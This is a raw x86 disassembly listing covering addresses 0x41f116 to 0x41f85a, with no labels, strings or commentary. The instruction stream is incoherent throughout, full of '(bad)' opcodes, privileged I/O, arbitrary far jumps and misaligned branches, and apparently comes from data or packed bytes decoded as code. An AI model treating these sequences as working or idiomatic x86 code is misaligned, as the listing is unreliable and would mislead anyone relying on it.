  41f116:	into   
  41f117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f118:	out    dx,eax
  41f119:	rcr    BYTE PTR [esp+eax*8],1
  41f11c:	add    DWORD PTR [ebx-0x4529c891],esi
  41f122:	iret   
  41f123:	aam    0x5e
  41f125:	into   
  41f126:	adc    al,0x27
  41f128:	jge    0x41f101
  41f12a:	in     eax,0xb2
  41f12c:	sub    bh,dh
  41f12e:	mov    cl,0x3
  41f130:	jecxz  0x41f102
  41f132:	stos   DWORD PTR es:[edi],eax
  41f133:	sbb    eax,0x1e03478d
  41f138:	lock dec edx
  41f13a:	or     DWORD PTR [ecx],ecx
  41f13c:	and    DWORD PTR [ecx-0x1b],eax
  41f13f:	test   DWORD PTR [ecx+0x33dddcea],ecx
  41f145:	xchg   edx,eax
  41f146:	or     BYTE PTR [ecx-0xe799cb3],ah
  41f14c:	add    eax,0xdee7fbab
  41f151:	mov    ah,0xd6
  41f153:	das    
  41f154:	xchg   edx,eax
  41f155:	xchg   DWORD PTR [ebx],edi
  41f157:	fld    DWORD PTR [eax+0x3e]
  41f15a:	cmc    
  41f15b:	not    BYTE PTR [ecx+ecx*1]
  41f15e:	mov    al,0x49
  41f160:	fcmovbe st,st(0)
  41f162:	mov    esp,DWORD PTR [edi-0x653a0d99]
  41f168:	jb     0x41f194
  41f16a:	push   esp
  41f16b:	pop    ds
  41f16c:	dec    eax
  41f16d:	cld    
  41f16e:	pop    edi
  41f16f:	inc    eax
  41f170:	popa   
  41f171:	adc    al,0x2e
  41f173:	jle    0x41f1dd
  41f175:	ret    0xea61
  41f178:	push   cs
  41f179:	or     al,0x58
  41f17b:	addr16 das 
  41f17d:	bound  ebx,QWORD PTR [edx-0x74943cad]
  41f183:	clc    
  41f184:	out    dx,al
  41f185:	std    
  41f186:	stc    
  41f187:	push   ecx
  41f188:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f189:	fild   WORD PTR [eax-0x24]
  41f18c:	sub    DWORD PTR [edx+0x52],0x42
  41f190:	nop
  41f191:	xor    BYTE PTR [esi+eax*1-0x446ebabf],dh
  41f198:	jns    0x41f184
  41f19a:	arpl   dx,bx
  41f19c:	add    ah,BYTE PTR [ebp-0x71]
  41f19f:	shl    DWORD PTR [esi+0x3d],1
  41f1a2:	repz and BYTE PTR [esi+0x54b5ac52],cl
  41f1a9:	fst    DWORD PTR ds:0x860b9d15
  41f1af:	push   0x6fe9fc0
  41f1b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1b5:	cmc    
  41f1b6:	or     DWORD PTR [ebx-0x1],esp
  41f1b9:	push   0x71
  41f1bb:	fdivrp st(4),st
  41f1bd:	outs   dx,DWORD PTR ds:[esi]
  41f1be:	mov    WORD PTR [ecx],ds
  41f1c0:	xchg   BYTE PTR [eax+0x47],cl
  41f1c3:	or     ch,BYTE PTR [esp+ecx*8]
  41f1c6:	in     eax,0x40
  41f1c8:	ds inc eax
  41f1ca:	in     al,dx
  41f1cb:	rcl    BYTE PTR [ebp+0x64efcd0c],1
  41f1d1:	pop    es
  41f1d2:	xchg   esi,eax
  41f1d3:	js     0x41f251
  41f1d5:	retf   0xc876
  41f1d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1d9:	aas    
  41f1da:	and    al,BYTE PTR [ebx]
  41f1dc:	popf   
  41f1dd:	or     al,0xa2
  41f1df:	lods   al,BYTE PTR ds:[esi]
  41f1e0:	lea    edx,[edi]
  41f1e2:	ret    
  41f1e3:	pusha  
  41f1e4:	leave  
  41f1e5:	and    BYTE PTR [ebp+0x41b663dc],bl
  41f1eb:	adc    al,0x87
  41f1ed:	and    edx,eax
  41f1ef:	inc    edx
  41f1f0:	pop    ds
  41f1f1:	or     al,BYTE PTR gs:[ecx-0x2d09629f]
  41f1f8:	popa   
  41f1f9:	add    ah,BYTE PTR [edx-0x2b]
  41f1fc:	xchg   ebp,eax
  41f1fd:	shr    DWORD PTR cs:[esi-0x49],0xd2
  41f202:	int    0x15
  41f204:	(bad)  [ebx+0x3bad5379]
  41f20a:	mov    BYTE PTR [ebp+0x61d5ee4],ah
  41f210:	cwde   
  41f211:	xchg   al,dl
  41f213:	jl     0x41f1d4
  41f215:	xor    ecx,DWORD PTR [ebx+0x171edc5a]
  41f21b:	mul    BYTE PTR [eax]
  41f21d:	daa    
  41f21e:	dec    ebp
  41f21f:	mov    ebp,0xb9bb7972
  41f224:	push   esi
  41f225:	(bad)  
  41f226:	call   0x20bc:0xae09f7df
  41f22d:	sbb    eax,0x867301f1
  41f232:	xor    ebx,DWORD PTR [esi+0x3f]
  41f235:	inc    edi
  41f236:	mov    bl,0x7d
  41f238:	jle    0x41f277
  41f23a:	sub    esi,DWORD PTR [edi-0x41]
  41f23d:	mov    eax,gs:0x4e935449
  41f243:	ret    
  41f244:	in     eax,0xae
  41f246:	sub    bl,BYTE PTR [esi+ebp*2]
  41f249:	dec    ebx
  41f24a:	sub    ch,ch
  41f24c:	ss jbe 0x41f209
  41f24f:	mov    dh,0x35
  41f251:	mov    cs,WORD PTR [ecx+0x37]
  41f254:	daa    
  41f255:	jae    0x41f274
  41f257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f258:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f259:	test   DWORD PTR [ecx-0x76],ebx
  41f25c:	retf   
  41f25d:	or     al,0xfc
  41f25f:	jnp    0x41f200
  41f261:	mov    al,ds:0x29b312c0
  41f266:	in     eax,dx
  41f267:	clc    
  41f268:	sbb    DWORD PTR [ebx+eax*4],ebp
  41f26b:	add    eax,0x43e16000
  41f271:	push   edx
  41f272:	jno    0x41f2d5
  41f274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f275:	jmp    0x56c1:0x3e2e4a39
  41f27c:	leave  
  41f27d:	stos   BYTE PTR es:[edi],al
  41f27e:	mov    cl,0x1a
  41f280:	adc    esi,esi
  41f282:	sahf   
  41f283:	std    
  41f284:	mov    WORD PTR [esi+ecx*4+0x11b323a8],?
  41f28b:	pop    esp
  41f28c:	cld    
  41f28d:	sbb    cl,0x17
  41f290:	mov    bh,0x50
  41f292:	pop    ebp
  41f293:	jnp    0x41f23f
  41f295:	sub    DWORD PTR [esi],0x4f
  41f298:	lahf   
  41f299:	mov    ah,0xa8
  41f29b:	inc    ecx
  41f29c:	cmp    al,0xe
  41f29e:	retf   0xac07
  41f2a1:	sbb    BYTE PTR [edi],ah
  41f2a3:	inc    ebp
  41f2a4:	in     eax,0x6b
  41f2a6:	lods   al,BYTE PTR ds:[esi]
  41f2a7:	fnstsw WORD PTR [edx+eax*1]
  41f2aa:	(bad)  
  41f2ab:	pop    ebx
  41f2ac:	xchg   edi,eax
  41f2ad:	das    
  41f2ae:	std    
  41f2af:	ret    0xdf9f
  41f2b2:	cmc    
  41f2b3:	jb     0x41f2c3
  41f2b5:	gs es cld 
  41f2b8:	mov    bl,0xa2
  41f2ba:	xor    eax,DWORD PTR [esi-0x1176d94e]
  41f2c0:	inc    ebp
  41f2c1:	pop    edi
  41f2c2:	gs js  0x41f2fd
  41f2c5:	mov    dh,0x43
  41f2c7:	sbb    eax,0x88fafc43
  41f2cc:	inc    ebx
  41f2cd:	(bad)  [edi]
  41f2cf:	xor    al,0x2e
  41f2d1:	mov    BYTE PTR [ebx],dh
  41f2d3:	inc    ebp
  41f2d4:	ret    
  41f2d5:	imul   edi,DWORD PTR [edx-0x6a4ea7dd],0x65
  41f2dc:	mov    ds:0x9773a45a,al
  41f2e1:	adc    eax,0xa3a9d5f3
  41f2e6:	dec    ebp
  41f2e7:	(bad)  
  41f2e8:	mov    ds:0xa4df7f4,al
  41f2ed:	mov    bl,0xb5
  41f2ef:	mov    bl,0xb2
  41f2f1:	stc    
  41f2f2:	jle    0x41f354
  41f2f4:	xchg   ebp,eax
  41f2f5:	scas   eax,DWORD PTR es:[edi]
  41f2f6:	pop    ss
  41f2f7:	or     DWORD PTR [ecx+edi*1-0x60],0x456bf16a
  41f2ff:	mov    cl,0xfd
  41f301:	das    
  41f302:	add    DWORD PTR [edx+0x5323b0ce],edx
  41f308:	jb     0x41f315
  41f30a:	leave  
  41f30b:	pushf  
  41f30c:	sbb    BYTE PTR [ebx],al
  41f30e:	lods   al,BYTE PTR ds:[esi]
  41f30f:	out    0xcc,eax
  41f311:	xor    edx,DWORD PTR [edx]
  41f313:	pop    ecx
  41f314:	fwait
  41f315:	mov    DWORD PTR [ebp+0x14],ebp
  41f318:	and    al,0x17
  41f31a:	adc    DWORD PTR [ecx+0x50],0x1711e2cd
  41f321:	mov    ds:0x7f967dc3,eax
  41f326:	dec    edi
  41f327:	push   esp
  41f328:	lahf   
  41f329:	sbb    al,0x1e
  41f32b:	fwait
  41f32c:	and    cl,BYTE PTR [edi-0x3b861d18]
  41f332:	push   eax
  41f333:	xlat   BYTE PTR ds:[ebx]
  41f334:	mov    ebp,gs
  41f336:	rol    BYTE PTR [eax+0x2f5deec],0x8
  41f33d:	push   ebp
  41f33e:	pushf  
  41f33f:	mov    dh,0x85
  41f341:	jmp    0x7c2f:0x7f25675d
  41f348:	sub    ch,cl
  41f34a:	gs es and al,0x3d
  41f34e:	cmc    
  41f34f:	sbb    bh,BYTE PTR [ebp+0xb48a4b3]
  41f355:	adc    eax,DWORD PTR [ecx-0x16]
  41f358:	pop    ds
  41f359:	dec    edx
  41f35a:	ja     0x41f3a4
  41f35c:	or     dl,cl
  41f35e:	out    dx,eax
  41f35f:	push   edx
  41f360:	xor    dh,al
  41f362:	hlt    
  41f363:	jp     0x41f396
  41f365:	cmp    DWORD PTR [eax-0x3a9dd3d9],eax
  41f36b:	rcr    BYTE PTR [ebp-0x1ac55dd6],0x93
  41f372:	inc    ebp
  41f373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f374:	xchg   ebp,eax
  41f375:	pop    eax
  41f376:	sub    BYTE PTR ds:0x63b15ddb,0xb0
  41f37d:	pop    es
  41f37e:	adc    eax,0x2cbfbbd
  41f383:	imul   edi,DWORD PTR [eax+0x45],0x5c
  41f387:	dec    ebp
  41f388:	xchg   edx,eax
  41f389:	xor    al,0x79
  41f38b:	jbe    0x1af7a26a
  41f391:	je     0x41f33f
  41f393:	leave  
  41f394:	xchg   BYTE PTR [eax],dl
  41f396:	xor    ah,BYTE PTR [edi+0x50]
  41f399:	mov    ebp,0x35a057f9
  41f39e:	outs   dx,BYTE PTR ds:[esi]
  41f39f:	test   DWORD PTR ds:0xb861d87,edi
  41f3a5:	and    DWORD PTR [eax],edi
  41f3a7:	push   ebp
  41f3a8:	add    BYTE PTR [edx],bh
  41f3aa:	jle    0x41f34b
  41f3ac:	add    ebx,DWORD PTR [esi-0xde4b317]
  41f3b2:	jl     0x41f400
  41f3b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3b5:	mov    ah,0x57
  41f3b7:	push   ss
  41f3b8:	mov    bh,0xea
  41f3ba:	sbb    DWORD PTR [edx+0x25bc04ce],edi
  41f3c0:	pop    edi
  41f3c1:	pop    eax
  41f3c2:	dec    esp
  41f3c3:	imul   ebp,DWORD PTR ds:[ebp-0x42],0x1d
  41f3c8:	stos   DWORD PTR es:[edi],eax
  41f3c9:	cld    
  41f3ca:	xchg   ebx,eax
  41f3cb:	dec    ebp
  41f3cc:	test   al,0x7c
  41f3ce:	xchg   ebx,eax
  41f3cf:	sbb    bh,BYTE PTR [esi+edx*2+0x12]
  41f3d3:	add    ebx,DWORD PTR [esi]
  41f3d5:	xchg   BYTE PTR [esi],ch
  41f3d7:	jmp    0x7352:0xe91abc6a
  41f3de:	pop    esp
  41f3df:	or     eax,0x6e17a331
  41f3e4:	out    0xcd,al
  41f3e6:	pop    ebp
  41f3e7:	test   eax,0xe2ac6bcc
  41f3ec:	pop    ds
  41f3ed:	call   0xc0c0:0x2f71c20a
  41f3f4:	addr16 inc esp
  41f3f6:	push   gs
  41f3f8:	retf   0xef7
  41f3fb:	mov    bh,0xbf
  41f3fd:	mov    al,BYTE PTR [ebp-0x80]
  41f400:	jl     0x41f480
  41f402:	jo     0x41f47b
  41f404:	jmp    0x3bf04a95
  41f409:	and    al,0x9a
  41f40b:	mov    bh,BYTE PTR [ecx]
  41f40d:	rcl    bl,cl
  41f40f:	mov    ebp,esi
  41f411:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f412:	lock pusha 
  41f414:	pop    esp
  41f415:	aam    0x5e
  41f417:	mov    ch,0x7a
  41f419:	add    BYTE PTR [edx+0x276dcd41],ch
  41f41f:	dec    edx
  41f420:	mov    ds:0x3c0fb4b5,ax
  41f426:	push   esp
  41f427:	sub    BYTE PTR ds:0x41222826,dl
  41f42d:	(bad)  
  41f42e:	(bad)  
  41f42f:	push   esp
  41f430:	adc    bh,bh
  41f432:	inc    edi
  41f433:	aad    0x68
  41f435:	xchg   edi,eax
  41f436:	aas    
  41f437:	mov    ebp,0x3f9d9a66
  41f43c:	mov    DWORD PTR [esi+0x1c],esi
  41f43f:	lea    esi,[ebx-0x24]
  41f442:	adc    BYTE PTR [edi-0x3e070e42],al
  41f448:	es sbb eax,0xa955b7e1
  41f44e:	jbe    0x41f468
  41f450:	lds    ecx,FWORD PTR [ecx-0x14c6c4c9]
  41f456:	cs mov edi,ebp
  41f459:	push   es
  41f45a:	xor    cl,ah
  41f45c:	mov    ah,0x6b
  41f45e:	ins    DWORD PTR es:[edi],dx
  41f45f:	add    ch,BYTE PTR [ecx-0x76]
  41f462:	mov    dl,0xdf
  41f464:	sbb    BYTE PTR ds:0x3c3f5aca,bh
  41f46a:	shr    esp,0x9b
  41f46d:	int3   
  41f46e:	fsubr  QWORD PTR ds:0x5ddee065
  41f474:	lods   eax,DWORD PTR ds:[esi]
  41f475:	inc    ebx
  41f476:	nop
  41f477:	fstp   DWORD PTR [edx-0x24]
  41f47a:	jmp    0x7fad:0x16e5f3a7
  41f481:	cld    
  41f482:	test   DWORD PTR [esi],0x68b51f5c
  41f488:	xchg   edi,eax
  41f489:	bound  ecx,QWORD PTR [eax+eax*4+0x4ba882e4]
  41f490:	and    cl,BYTE PTR [ebp-0x71]
  41f493:	cmc    
  41f494:	add    ah,BYTE PTR [ebp-0x44]
  41f497:	mov    esp,0x58110c6
  41f49c:	jecxz  0x41f506
  41f49e:	mov    cl,0x1f
  41f4a0:	push   0xca3b7252
  41f4a5:	pop    ecx
  41f4a6:	sub    DWORD PTR [edx+0x38],esp
  41f4a9:	test   BYTE PTR [edx+0x17011a0a],dl
  41f4af:	lahf   
  41f4b0:	scas   al,BYTE PTR es:[edi]
  41f4b1:	dec    eax
  41f4b2:	dec    edx
  41f4b3:	int    0x9c
  41f4b5:	in     eax,0x8c
  41f4b7:	sbb    al,0x80
  41f4b9:	jne    0x41f51a
  41f4bb:	dec    edx
  41f4bc:	jbe    0x41f444
  41f4be:	xor    ebp,esi
  41f4c0:	xchg   edx,eax
  41f4c1:	xchg   BYTE PTR [edx],cl
  41f4c3:	lock xchg edi,eax
  41f4c5:	push   ss
  41f4c6:	outs   dx,DWORD PTR ds:[esi]
  41f4c7:	push   eax
  41f4c8:	daa    
  41f4c9:	loope  0x41f53c
  41f4cb:	clc    
  41f4cc:	(bad)  
  41f4ce:	or     dh,ah
  41f4d0:	dec    ebx
  41f4d1:	jmp    0x41f49b
  41f4d3:	pop    esi
  41f4d4:	test   DWORD PTR [edx-0x79],ebx
  41f4d7:	lods   al,BYTE PTR ds:[esi]
  41f4d8:	mov    dl,0x8d
  41f4da:	gs inc edi
  41f4dc:	push   esp
  41f4dd:	int    0x83
  41f4df:	shr    DWORD PTR [edi+ecx*2-0x3e547e9c],0x5b
  41f4e7:	div    DWORD PTR [ebx+0x50]
  41f4ea:	dec    ebx
  41f4eb:	idiv   DWORD PTR [ebx+ebp*8+0x3e]
  41f4ef:	mov    edx,0xf0036349
  41f4f4:	(bad)  
  41f4f5:	out    0x93,al
  41f4f7:	mov    edx,DWORD PTR [esi+0x7f]
  41f4fa:	in     eax,dx
  41f4fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4fc:	dec    ebp
  41f4fd:	and    al,BYTE PTR [ebx-0x11]
  41f500:	push   0x7e8ef741
  41f505:	je     0x41f57c
  41f507:	mov    ss,WORD PTR ds:0x73ea757b
  41f50d:	lods   al,BYTE PTR ds:[esi]
  41f50e:	jne    0x41f535
  41f510:	push   edi
  41f511:	xchg   edx,eax
  41f512:	nop
  41f513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f514:	loopne 0x41f536
  41f516:	int3   
  41f517:	ret    0x182b
  41f51a:	pop    esp
  41f51b:	stos   BYTE PTR es:[edi],al
  41f51c:	int3   
  41f51d:	int3   
  41f51e:	mov    eax,ds:0x42580945
  41f523:	xchg   DWORD PTR [edx],ebx
  41f525:	jnp    0x41f4f1
  41f527:	adc    eax,0x13bafd79
  41f52c:	imul   esi,esp,0x9432327b
  41f532:	fisub  WORD PTR [esp+esi*4+0x4c]
  41f536:	rol    BYTE PTR [edx+0x20],cl
  41f539:	jno    0x41f4ea
  41f53b:	xchg   esp,eax
  41f53c:	jnp    0x41f55a
  41f53e:	(bad)  
  41f53f:	(bad)  
  41f541:	xchg   BYTE PTR [esp+ebp*8-0x8],bh
  41f545:	cmp    esp,DWORD PTR [edi-0x47]
  41f548:	int    0xd6
  41f54a:	xchg   edx,eax
  41f54b:	scas   al,BYTE PTR es:[edi]
  41f54c:	cwde   
  41f54d:	pop    ecx
  41f54e:	ds sahf 
  41f550:	xchg   BYTE PTR [ebp-0x6671f74d],al
  41f556:	xlat   BYTE PTR ds:[ebx]
  41f557:	rep outs dx,DWORD PTR ds:[esi]
  41f559:	push   0xffffff89
  41f55b:	xor    esi,DWORD PTR [esi-0x21eb4c82]
  41f561:	mov    ah,0x4b
  41f563:	popf   
  41f564:	fcmove st,st(4)
  41f566:	in     al,0x9a
  41f568:	aaa    
  41f569:	sub    ebp,DWORD PTR [esi-0x28cc9f1f]
  41f56f:	jno    0x41f5c0
  41f571:	imul   ebp,DWORD PTR [edx-0x453e753b],0x52af369b
  41f57b:	iret   
  41f57c:	push   0xefc7f70a
  41f581:	loopne 0x41f58b
  41f583:	iret   
  41f584:	add    edx,DWORD PTR [ebp+0x2b431cd]
  41f58a:	fild   DWORD PTR [eax]
  41f58c:	dec    edx
  41f58d:	repz rol DWORD PTR [ecx-0x56a2433d],0x68
  41f595:	mov    ebx,0xa7e86cdd
  41f59a:	jmp    0xb087:0x4bc76a0b
  41f5a1:	sbb    bh,cl
  41f5a3:	lods   eax,DWORD PTR ds:[esi]
  41f5a4:	repnz enter 0xa394,0xf3
  41f5a9:	dec    edi
  41f5aa:	adc    edx,ebp
  41f5ac:	aaa    
  41f5ad:	sbb    DWORD PTR [ebx-0x5dc7f93f],0x38f7d2f5
  41f5b7:	push   es
  41f5b8:	pop    ds
  41f5b9:	xor    al,0xef
  41f5bb:	adc    edi,DWORD PTR [esi]
  41f5bd:	fsub   QWORD PTR [ebx+0x21]
  41f5c0:	je     0x41f5fa
  41f5c2:	sti    
  41f5c3:	imul   ebx,DWORD PTR [ebx-0x13],0xffffffb5
  41f5c7:	xchg   edi,eax
  41f5c8:	sahf   
  41f5c9:	jbe    0x41f5f9
  41f5cb:	ret    
  41f5cc:	sub    eax,0x46557938
  41f5d1:	scas   al,BYTE PTR es:[edi]
  41f5d2:	addr16 sbb cl,al
  41f5d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5d7:	sbb    bh,BYTE PTR [eax-0x66dcef3]
  41f5dd:	jbe    0x41f581
  41f5df:	push   es
  41f5e0:	pop    ds
  41f5e1:	leave  
  41f5e2:	in     eax,dx
  41f5e3:	sbb    ebx,esp
  41f5e5:	aad    0xd3
  41f5e7:	sub    ebx,ebx
  41f5e9:	jmp    0x41f58d
  41f5eb:	mov    ah,0x1
  41f5ed:	inc    esi
  41f5ee:	(bad)  
  41f5ef:	sub    BYTE PTR [esi-0x25bbba95],bl
  41f5f5:	in     eax,0xf4
  41f5f7:	sti    
  41f5f8:	push   ds
  41f5f9:	(bad)  
  41f5fa:	jns    0x41f608
  41f5fc:	call   0xe998:0x9c9ed2dd
  41f603:	adc    eax,0x9a3c0a0e
  41f608:	inc    edx
  41f609:	push   ds
  41f60a:	sub    DWORD PTR [ecx+0x3c],ebp
  41f60d:	jns    0x41f5fe
  41f60f:	iret   
  41f610:	cmp    dl,cl
  41f612:	imul   eax,DWORD PTR [edx-0x2c6e4ff0],0xffffffc6
  41f619:	fld    TBYTE PTR [ebx+0x37bc95a1]
  41f61f:	popa   
  41f620:	and    al,0xc6
  41f622:	xchg   ebx,ecx
  41f624:	and    DWORD PTR [ebx-0x7512b4e8],ebp
  41f62a:	ret    0xd8df
  41f62d:	imul   ebp,ebp,0x47
  41f630:	xchg   BYTE PTR [edx],ah
  41f632:	(bad)  
  41f633:	sbb    BYTE PTR ds:0xe83227e4,bh
  41f639:	push   ebp
  41f63a:	adc    DWORD PTR [edx],0x2bfee70
  41f640:	xchg   esp,eax
  41f641:	and    eax,0xa8456e76
  41f646:	cmp    esp,DWORD PTR [edx]
  41f648:	jp     0x41f644
  41f64a:	adc    al,BYTE PTR [edx]
  41f64c:	fadd   st,st(3)
  41f64e:	daa    
  41f64f:	imul   ecx,ebp,0x65bf56e2
  41f655:	test   DWORD PTR [eax+esi*8-0x74],ebx
  41f659:	gs or  esi,ecx
  41f65c:	daa    
  41f65d:	pop    ebp
  41f65e:	pop    es
  41f65f:	or     BYTE PTR [edi],dl
  41f661:	mov    al,0x40
  41f663:	or     eax,0x33729d8a
  41f668:	and    DWORD PTR [edx-0x45],0x25dbbe86
  41f66f:	mov    ah,0xa7
  41f671:	popf   
  41f672:	ror    ecx,0xd1
  41f675:	adc    bl,0xb8
  41f678:	ret    0xb627
  41f67b:	mov    ds:0x9719e807,al
  41f680:	outs   dx,BYTE PTR ds:[esi]
  41f681:	rol    esp,0x13
  41f684:	push   eax
  41f685:	xchg   edx,eax
  41f686:	push   0x304a145c
  41f68b:	div    BYTE PTR [edi]
  41f68d:	repnz and al,0x4f
  41f690:	jae    0x41f62c
  41f692:	push   ss
  41f693:	gs (bad) 
  41f695:	xchg   esi,eax
  41f696:	inc    edi
  41f697:	loopne 0x41f718
  41f699:	retf   0xa8e
  41f69c:	sbb    al,0x4e
  41f69e:	xchg   BYTE PTR [ebx+0x5c],ch
  41f6a1:	and    ch,dh
  41f6a3:	adc    ah,bl
  41f6a5:	add    DWORD PTR [eax+edi*2+0x36],ebx
  41f6a9:	bound  esp,QWORD PTR [eax+0x5a]
  41f6ac:	pop    esp
  41f6ad:	sbb    BYTE PTR [edx],0xc6
  41f6b0:	and    al,0x69
  41f6b2:	pop    ebp
  41f6b3:	imul   esi
  41f6b5:	scas   eax,DWORD PTR es:[edi]
  41f6b6:	icebp  
  41f6b7:	inc    eax
  41f6b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6b9:	mov    dh,0xd6
  41f6bb:	ret    
  41f6bc:	into   
  41f6bd:	add    edx,DWORD PTR [eax]
  41f6bf:	in     al,dx
  41f6c0:	cmp    cl,BYTE PTR [edi]
  41f6c2:	adc    al,0xa0
  41f6c4:	mov    ds:0x166763e4,al
  41f6c9:	mov    ?,WORD PTR [ebp-0x1741b64e]
  41f6cf:	jp     0x41f70e
  41f6d1:	cmp    BYTE PTR [edi-0x203fc45b],ch
  41f6d7:	mov    WORD PTR [ecx+0x5eedfa9],gs
  41f6dd:	bound  eax,QWORD PTR [edi]
  41f6df:	not    BYTE PTR [ecx]
  41f6e1:	cld    
  41f6e2:	(bad)  
  41f6e3:	mov    ds:0x2e73dbcf,eax
  41f6e8:	inc    ecx
  41f6e9:	jns    0x41f6df
  41f6eb:	fucomip st,st(6)
  41f6ed:	lock mov ?,WORD PTR [esi+edx*1+0x7d4cf13a]
  41f6f5:	xchg   ecx,eax
  41f6f6:	(bad)  
  41f6f7:	ja     0x41f69b
  41f6f9:	sbb    eax,0x615b9621
  41f6fe:	cwde   
  41f6ff:	out    dx,al
  41f700:	sbb    al,0xf2
  41f702:	aam    0x6
  41f704:	inc    edx
  41f705:	pop    ecx
  41f706:	popf   
  41f707:	call   DWORD PTR [edx+0x32]
  41f70a:	and    BYTE PTR [edi+0x790d6098],al
  41f710:	sub    ch,0xb5
  41f713:	into   
  41f714:	dec    edx
  41f715:	sub    al,0xa5
  41f717:	mov    al,0x83
  41f719:	or     eax,DWORD PTR [ebp-0x64]
  41f71c:	icebp  
  41f71d:	mov    WORD PTR [ecx-0x4a],fs
  41f720:	fwait
  41f721:	shl    BYTE PTR [edx],cl
  41f723:	xor    al,0xf9
  41f725:	(bad)  
  41f726:	jg     0x41f6d1
  41f728:	daa    
  41f729:	push   ds
  41f72a:	mov    al,0x5
  41f72c:	sbb    BYTE PTR [ecx-0x28b3fdef],ah
  41f732:	aam    0x6
  41f734:	rcr    dh,cl
  41f736:	stos   BYTE PTR es:[edi],al
  41f737:	or     al,0xc6
  41f739:	xor    DWORD PTR [edx+0x11a8cf2b],0xc106791f
  41f743:	push   es
  41f744:	push   eax
  41f745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f746:	push   ebp
  41f747:	icebp  
  41f748:	into   
  41f749:	mov    al,0x3e
  41f74b:	scas   al,BYTE PTR es:[edi]
  41f74c:	xlat   BYTE PTR ds:[ebx]
  41f74d:	or     esp,0xc5a87e60
  41f753:	bound  ebx,QWORD PTR [ebx-0x3d]
  41f756:	adc    ebx,DWORD PTR [ecx-0x3ff43173]
  41f75c:	call   FWORD PTR [esi]
  41f75e:	adc    eax,0xa564b797
  41f763:	aad    0xf0
  41f765:	mov    ecx,0xda4d1d1f
  41f76a:	mov    dh,0x22
  41f76c:	xor    DWORD PTR [esi-0x33],esp
  41f76f:	imul   eax,DWORD PTR [eax+edx*8+0x27b4e7b5],0x5d5784ea
  41f77a:	mov    BYTE PTR [ebx+0x7a53ed64],0xec
  41f781:	add    eax,0x59cff54e
  41f786:	jb     0x41f744
  41f788:	jp     0x41f7c4
  41f78a:	imul   esp,DWORD PTR [edx-0x72],0xa83f56e
  41f791:	sbb    eax,0x1ad5eb3f
  41f796:	jne    0x41f768
  41f798:	jno    0x41f79c
  41f79a:	xchg   ebp,eax
  41f79b:	jns    0x41f798
  41f79d:	jno    0x41f7a0
  41f79f:	inc    edx
  41f7a0:	cli    
  41f7a1:	shl    DWORD PTR [ebx],1
  41f7a3:	add    eax,0xbfa55a28
  41f7a8:	mov    ecx,0x2ee90e84
  41f7ad:	mov    eax,ds:0x935ddf67
  41f7b2:	aam    0xde
  41f7b4:	inc    edx
  41f7b5:	xchg   DWORD PTR [eax+0x641afa18],ecx
  41f7bb:	jecxz  0x41f7e3
  41f7bd:	pop    eax
  41f7be:	(bad)  
  41f7bf:	iret   
  41f7c0:	xchg   ecx,eax
  41f7c1:	and    al,ch
  41f7c3:	inc    esp
  41f7c4:	cwde   
  41f7c5:	repnz push ebp
  41f7c7:	jmp    0x41f7b5
  41f7c9:	cli    
  41f7ca:	pop    ebp
  41f7cb:	in     eax,dx
  41f7cc:	mov    al,ds:0xced0cb9d
  41f7d1:	jmp    0x14de6a6d
  41f7d6:	adc    edi,edi
  41f7d8:	sti    
  41f7d9:	int    0xce
  41f7db:	popf   
  41f7dc:	imul   esi,DWORD PTR [edi-0x15ce0c81],0x8b5281e7
  41f7e6:	cmovl  ebp,DWORD PTR [ebx]
  41f7e9:	or     edx,ebx
  41f7eb:	xchg   ebx,eax
  41f7ec:	fistp  QWORD PTR [eax+edi*4]
  41f7ef:	bound  edi,QWORD PTR [eax]
  41f7f1:	and    BYTE PTR [eax+0x60a3dbf0],bh
  41f7f7:	outs   dx,DWORD PTR ds:[esi]
  41f7f8:	mov    ebp,0xd7dce40c
  41f7fd:	xchg   esi,eax
  41f7fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7ff:	in     al,0xcd
  41f801:	cwde   
  41f802:	(bad)  
  41f803:	jl     0x41f82b
  41f805:	ret    0xbfb4
  41f808:	sbb    al,BYTE PTR [esi]
  41f80a:	outs   dx,DWORD PTR ds:[esi]
  41f80b:	xor    esp,DWORD PTR [edx-0x37]
  41f80e:	jecxz  0x41f7ea
  41f810:	iret   
  41f811:	mov    ebp,0x245ebf9b
  41f816:	add    DWORD PTR [eax-0x3],edx
  41f819:	xchg   edx,eax
  41f81a:	iret   
  41f81b:	in     al,dx
  41f81c:	adc    DWORD PTR [ecx+ebp*1-0x22],ebp
  41f820:	mov    ds:0x86daf6de,al
  41f825:	fwait
  41f826:	js     0x41f828
  41f828:	nop
  41f829:	jecxz  0x41f849
  41f82b:	and    esi,eax
  41f82d:	(bad)  
  41f82e:	retf   0x8570
  41f831:	mov    ebp,0x499b4411
  41f836:	and    BYTE PTR [esp+edx*1-0x6a],cl
  41f83a:	jmp    0x41f8a7
  41f83c:	cmp    DWORD PTR [edx+0x3f],edx
  41f83f:	out    0x1c,eax
  41f841:	or     bl,dh
  41f843:	or     al,0x9c
  41f845:	adc    al,0xe0
  41f847:	adc    BYTE PTR [ebx+0x34],dh
  41f84a:	bound  ecx,QWORD PTR [edx]
  41f84c:	cmp    esp,DWORD PTR [esi]
  41f84e:	xchg   esi,eax
  41f84f:	not    ebx
  41f851:	aad    0x65
  41f853:	cwde   
  41f854:	ins    BYTE PTR es:[edi],dx
  41f855:	hlt    
  41f856:	inc    ebp
  41f857:	add    al,0x6c
  41f859:	cld    
  41f85a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
